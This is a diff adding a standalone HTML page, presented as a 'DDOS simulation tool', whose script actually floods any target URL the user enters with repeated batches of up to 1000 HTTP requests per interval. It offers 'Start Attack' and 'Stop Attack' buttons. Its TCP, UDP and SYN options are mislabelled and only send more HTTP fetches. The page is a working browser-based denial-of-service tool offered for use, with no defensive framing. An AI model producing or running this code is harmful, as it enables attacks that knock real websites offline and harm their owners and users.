@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>High Power DDOS Simulation Tool</title>
+<style>
+  body {
+    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    color: #e0e0e0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    margin: 0;
+    padding: 20px;
+  }
+  h1 {
+    text-align: center;
+    font-weight: 900;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    margin-bottom: 25px;
+  }
+  .container {
+    max-width: 480px;
+    margin: 0 auto;
+    background: rgba(255,255,255,0.05);
+    padding: 20px 30px;
+    border-radius: 12px;
+    box-shadow: 0 0 25px rgba(0,0,0,0.5);
+    user-select: none;
+  }
+  label {
+    display: block;
+    margin-top: 15px;
+    font-weight: 700;
+    letter-spacing: 0.4px;
+  }
+  input[type=text], input[type=url], select, input[type=number] {
+    width: 100%;
+    padding: 10px 14px;
+    margin-top: 6px;
+    border-radius: 8px;
+    border: none;
+    outline: none;
+    font-size: 15px;
+    background: #182c38;
+    color: #eee;
+    transition: background 0.3s ease;
+  }
+  input[type=text]:focus, input[type=url]:focus, select:focus, input[type=number]:focus {
+    background: #1f4154;
+  }
+  button {
+    margin-top: 25px;
+    width: 100%;
+    padding: 14px;
+    background-color: #ee4b2b;
+    border: none;
+    border-radius: 12px;
+    color: #fff;
+    font-weight: 900;
+    font-size: 18px;
+    cursor: pointer;
+    letter-spacing: 1px;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #ff6333;
+  }
+  .log {
+    margin-top: 20px;
+    background: rgba(255,255,255,0.1);
+    border-radius: 12px;
+    max-height: 200px;
+    overflow-y: auto;
+    padding: 15px;
+    font-size: 14px;
+    font-family: monospace;
+    color: #a3f7bf;
+  }
+</style>
+</head>
+<body>
+  <h1>DDOS Simulation Tool</h1>
+  <div class="container">
+    <label for="targetUrl">Target URL</label>
+    <input type="url" id="targetUrl" placeholder="https://target.example.com" required />
+
+    <label for="methods">Attack Method (Layer 7 & Layer 4)</label>
+    <select id="methods" multiple size="6">
+      <option value="GET">GET (Layer 7)</option>
+      <option value="POST">POST (Layer 7)</option>
+      <option value="HEAD">HEAD (Layer 7)</option>
+      <option value="TCP">TCP (Layer 4)</option>
+      <option value="UDP">UDP (Layer 4)</option>
+      <option value="SYN">SYN Flood (Layer 4)</option>
+    </select>
+
+    <label for="power">Power (Number of requests per batch):</label>
+    <input type="number" id="power" min="1" max="1000" value="100" />
+
+    <label for="interval">Interval Between Batches (ms):</label>
+    <input type="number" id="interval" min="10" max="10000" value="100" />
+
+    <button id="startBtn">Start Attack</button>
+    <button id="stopBtn" disabled>Stop Attack</button>
+
+    <div class="log" id="log"></div>
+  </div>
+
+<script>
+(function(){
+  const startBtn = document.getElementById('startBtn');
+  const stopBtn = document.getElementById('stopBtn');
+  const logElem = document.getElementById('log');
+
+  let attackInterval = null;
+
+  function log(msg) {
+    const timestamp = new Date().toLocaleTimeString();
+    logElem.textContent += `[${timestamp}] ${msg}\n`;
+    logElem.scrollTop = logElem.scrollHeight;
+  }
+
+  // Simulate Layer 4 TCP/UDP by creating a WebSocket or WebRTC connection is not feasible here.
+  // We'll simulate Layer 4 methods by sending fetch requests with dummy payloads or aborting connections.
+  function sendLayer4Attack(target, method) {
+    // TCP & UDP and SYN Flood cannot be truly simulated in browser.
+    // We simulate by opening WebSocket or by fetch abort.
+    if (method === 'TCP' || method === 'UDP' || method === 'SYN') {
+      // Creating dummy fetch with timeout to simulate connection flood
+      fetch(target, { mode: 'no-cors' })
+        .then(() => log(`Sent simulated ${method} request`))
+        .catch(() => log(`Sent simulated ${method} request (failed)`));
+      return;
+    }
+  }
+
+  function sendLayer7Attack(target, method) {
+    // Send normal HTTP fetch requests with various methods
+    const opts = {
+      method: method,
+      mode: 'no-cors',
+      cache: 'no-cache',
+      headers: { 'X-DDoS-Fake': 'true' }
+    };
+    if(method === 'POST') {
+      opts.body = 'payload=' + Math.random();
+      opts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+    }
+    fetch(target, opts)
+      .then(() => log(`Sent ${method} request`))
+      .catch(() => log(`${method} request error`));
+  }
+
+  function performAttack(target, methods, power) {
+    methods.forEach(method => {
+      for(let i=0; i<power; i++) {
+        if(['GET','POST','HEAD'].includes(method)) {
+          sendLayer7Attack(target, method);
+        } else {
+          sendLayer4Attack(target, method);
+        }
+      }
+    });
+  }
+
+  startBtn.addEventListener('click', () => {
+    const target = document.getElementById('targetUrl').value.trim();
+    if (!target) {
+      alert('Please enter a valid target URL');
+      return;
+    }
+    const selectedOptions = Array.from(document.getElementById('methods').selectedOptions);
+    if (selectedOptions.length === 0) {
+      alert('Please select at least one attack method');
+      return;
+    }
+    const methods = selectedOptions.map(opt => opt.value);
+    const power = parseInt(document.getElementById('power').value) || 100;
+    const interval = parseInt(document.getElementById('interval').value) || 100;
+
+    startBtn.disabled = true;
+    stopBtn.disabled = false;
+    logElem.textContent = '';
+    log('Attack started...');
+
+    attackInterval = setInterval(() => {
+      performAttack(target, methods, power);
+    }, interval);
+  });
+
+  stopBtn.addEventListener('click', () => {
+    if(attackInterval) {
+      clearInterval(attackInterval);
+      attackInterval = null;
+      log('Attack stopped');
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+    }
+  });
+
+})();
+</script>
+</body>
+</html>
+
+```
